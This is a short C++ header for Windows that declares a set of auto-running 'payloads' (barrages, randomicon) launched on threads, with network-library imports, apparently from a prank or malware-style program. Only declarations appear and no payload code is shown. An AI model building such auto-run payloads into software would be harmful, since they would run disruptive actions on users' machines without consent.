#pragma once
#include <Windows.h>
#include <WinInet.h>
#include <fstream>

#pragma comment( lib, "wininet.lib" )

using namespace std;

#define RunPayload(Payload, Argument) CreateThread(NULL, NULL, Payload, Argument, NULL, NULL)

struct Payload_Info { const char* description; DWORD(__stdcall *entrance)(LPVOID argument); int startup_delay; };

extern Payload_Info autorun_payloads[];
extern int autorun_payloads_count;

DWORD WINAPI payload_barrages(LPVOID argument);
DWORD WINAPI payload_randomicon(LPVOID argument);
